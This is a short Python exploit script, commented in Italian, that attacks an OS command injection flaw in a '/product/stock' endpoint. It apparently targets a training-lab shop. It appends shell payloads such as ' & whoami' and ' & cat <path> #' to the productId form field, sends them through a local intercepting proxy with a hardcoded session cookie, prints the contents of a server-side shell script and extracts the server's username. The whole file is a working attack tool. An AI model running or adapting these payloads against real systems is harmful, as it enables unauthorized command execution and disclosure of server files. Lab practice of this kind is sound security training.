import requests
import sys
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def perform_request(url,exploit):
    uri = "/product/stock"
    data = {'productId' : '2'+exploit , 'storeId' : '1'}
    cookies = {'session' : 'Em4GFM41GaI5qCjgUnd8D3UNxVgeG9y9'}
    print("[+] Inviato exploit: ", data)
    response = requests.post(url + uri, data=data, cookies=cookies, verify=False, proxies=proxies)
    return response

def command_injection_exploit(url):
    print("[+] Testiamo la vulnerabilità OS Command Injection")
    exploits = [" & whoami", " & cat", " & whoami #"]
    print("[+] Exploit da usare:", exploits)
    response = perform_request(url,exploits[0])
    print("[+] Testo di risposta del server:\n")
    print(response.text)
    if ".sh" in response.text:
        print("\n[+] Estrazione nome e contenuto script del server remoto...")
        remote_script_name = re.search(r'\/.+sh', response.text)[0]
        print("[+] Nome script (full path): %s" % remote_script_name)
        exploit = "{0} {1} #".format(exploits[1], remote_script_name)
        response = perform_request(url,exploit)
        print("[+] Contenuto script:\n")
        print(response.text)
        print("[+] Estrazione nome utente...")
        response = perform_request(url,exploits[2])
        print("[+] Il nome utente è:", response.text)
        return True
    return False



def main():
    if len(sys.argv) != 2:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s www.esempio.com" % sys.argv[0])
        sys.exit()

    url = sys.argv[1]
    if not command_injection_exploit(url):
        print("[-] Exploit fallito.")


if __name__ == "__main__":
    main()